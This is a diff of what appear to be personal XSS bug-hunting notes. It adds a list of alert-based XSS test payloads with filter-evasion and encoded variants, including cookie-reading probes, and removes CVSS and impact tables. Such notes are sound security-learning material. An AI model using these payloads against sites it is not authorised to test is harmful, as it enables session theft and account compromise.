@@ -83,6 +83,25 @@ o	Comment boxes , search bar’s etc..
 #Cookie Steal
 <script>alert(document.cookie)</script>
 
+#payloads
+https://xssnow.in/payloads.html
+https://github.com/devspidr/XSS_payloads_list
+%00<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<body onload=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<a href=javascript:alert(1)>Click me</a>
+"><script>alert(location.hash)</script>
+<img src=x onerror=alert(document.cookie)>
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<ScRiPt>alert(1)</ScRiPt>
+<svg><script>alert(1)</script></svg>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+"><svg/onload=alert(1)>//
+
 
 
 
@@ -173,11 +192,7 @@ Usage Example: dalfox url http://testphp.vulnweb.com/?artist=
 •	It checks for reflected, stored, and DOM-based payload injection points.
 
 
-
-                                                                                              Payloads
-
-https://xssnow.in/payloads.html
-
+                                                                      
 
 
 
@@ -210,64 +225,9 @@ https://webhook.site/your-custom-id
 4.	Go back to Webhook.site, and you'll see the captured data in real-time.
 
 
-Where you can inject at :
-•	URL parameters (e.g., ?id=< payload >
-•	Any input field on the website.
-
-
- 
-                                                  
-                                                    XSS Paylods : https://github.com/devspidr/XSS_payloads_list
-
-
-
-                                                   XSS Testing Via Various file extensions:https://drive.google.com/drive/folders/1septocFovIZUawfH_ZE88IlpU5lFhDRk?usp=sharing
                                                                                   
  
-                                                                                       
-
-
-                                                                                          CVSS
-
-
-
-
-    XSS Type	CVSS Score Priority
     
-Reflected XSS	             6.1	P3 (Medium)
-Stored XSS	               8.8	P1 (Critical)
-Blind XSS	                 8.0 – 9.0	P1 (Critical)
-DOM-Based XSS	             6.1 – 7.5	P3 (Medium)
-                                                                                   
-
-                                                                            
-                                                                                      Impact
-
-🔴 Reflected XSS — Impact
-Session cookie theft
-Phishing via malicious links
-User redirection to fake pages
-Unauthorized actions using victim’s session
-
-🔴 Stored XSS — Impact
-Mass user account compromise
-Admin account takeover
-Theft of sensitive user data
-Persistent malicious content affecting all users
-Complete application trust breakdown
-
-🔴 Blind XSS — Impact
-Admin panel compromise
-Internal system access
-Credential theft of privileged users
-Exposure of sensitive logs and dashboards
-
-🔴 DOM-Based XSS — Impact
-Client-side session hijacking
-Data manipulation in browser
-Malicious redirects and phishing
-Bypass of client-side security controls
-
 
                                                                                                  Remediation
 
@@ -295,26 +255,7 @@ Secure admin cookies with HttpOnly and Secure flags
 Avoid unsafe JavaScript functions (innerHTML, eval, document.write)
 Use safe DOM APIs (textContent, innerText)
 Validate and encode data before inserting into DOM
-Implement strict CSP
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Implement strict CSP 
 
 
 
